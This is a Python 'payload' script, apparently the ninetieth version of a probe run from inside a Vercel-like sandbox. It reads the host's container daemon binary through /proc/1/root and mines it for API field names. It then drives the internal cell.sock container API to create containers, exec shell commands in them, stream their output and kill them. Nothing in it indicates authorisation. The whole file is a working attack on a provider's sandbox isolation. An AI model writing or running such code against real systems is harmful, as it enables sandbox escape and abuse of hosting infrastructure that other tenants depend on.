# -*- coding: utf-8 -*-
"""v90 payload: attachStdin(驼峰) 测试 → CreateTaskWithStdin.WithStreams → StreamOutput 拉输出
v89 发现: CreateRequest.AttachStdin 字段5, json=attachStdin (驼峰!); v89 用 snake_case 可能未生效
v81 符号: CreateTaskWithStdin.WithStreams.func1 → attach_stdin=true 时容器 streams 被收集
v90: (a) attachStdin:true 创建 → Start → Exec → StreamOutput (b) Process/Sandbox 字段提取
    (c) Create 完整字段变体 (d) attachStdin:false 对照"""
import socket, time, os, json, re, struct

OUT = '/vercel/sandbox/v90c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v90c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def grpc_req(pl):
    return b'\x00' + struct.pack('>I', len(pl)) + pl


def main():
    log('V90 payload start pid=%d' % os.getpid())
    R = '/proc/1/root'
    data = open(R + '/opt/vercel/celld', 'rb').read()

    # A. Process / Sandbox / CreateResponse / StreamOutputResponse / MountRequest 字段
    for mname in ('Process', 'Sandbox', 'CreateResponse', 'StreamOutputResponse', 'MountRequest', 'ProcessInfo'):
        pat = re.compile(rb'containers\.\(\*' + re.escape(mname.encode()) + rb'\)\.Get([A-Za-z0-9_]+)')
        got = sorted(set(m.group(1).decode() for m in pat.finditer(data)))
        log('GET %s: %s' % (mname, got))

    # B. "attached" 错误字符串上下文
    for m in re.finditer(rb'attached', data):
        i = m.start()
        seg = data[max(0, i - 200):i + 200]
        strs = re.findall(rb'[\x20-\x7e]{4,}', seg)
        log('ATT-CTX: %s' % ' | '.join(s.decode(errors='replace')[:80] for s in strs[:10]))
        break

    # C. attachStdin 测试矩阵
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    bodies = [
        ('A', '{"drive_id":"sandbox","attachStdin":true}'),
        ('B', '{"drive_id":"sandbox","attachStdin":false}'),
        ('C', '{"drive_id":"sandbox"}'),
        ('D', '{"driveId":"sandbox","attachStdin":true}'),
        ('E', '{"drive_id":"sandbox","attachStdin":true,"command":"/bin/sh","arguments":["-c","sleep 30"]}'),
    ]
    for tag, body in bodies:
        st, bd = rpc(CTR + '/Create', body, t=8)
        cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
        log('%s CREATE %s -> %s cid=%s' % (tag, body, st, cid or bd[:120]))
        if not cid:
            continue
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(0.8)
        argv = ['/bin/sh', '-c', 'echo V90_OUT_%s_ABC123; echo V90_ERR_%s_XYZ789 >&2; sleep 20' % (tag, tag)]
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('%s execA PA=%s' % (tag, PA or bd[:80]))
        time.sleep(1)
        for sv in (1, 2):
            pl = pstr(1, cid) + pvar(2, sv)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput', grpc_req(pl), 'application/grpc', t=4)
            log('%s SO#%d -> %s %r' % (tag, sv, st, bd[:220]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('%s killed' % tag)
        time.sleep(0.5)

    # D. 无 Start 直接 StreamOutput (attach 检查时序)
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox","attachStdin":true}', t=8)
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('F CREATE cid=%s' % (cid or 'NONE'))
    if cid:
        pl = pstr(1, cid) + pvar(2, 1)
        st, hd, bd = rpc_raw(CTR + '/StreamOutput', grpc_req(pl), 'application/grpc', t=4)
        log('F SO-before-start -> %s %r' % (st, bd[:200]))
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        st, hd, bd = rpc_raw(CTR + '/StreamOutput', grpc_req(pl), 'application/grpc', t=4)
        log('F SO-after-start -> %s %r' % (st, bd[:200]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)

    log('V90C_DONE')


main()
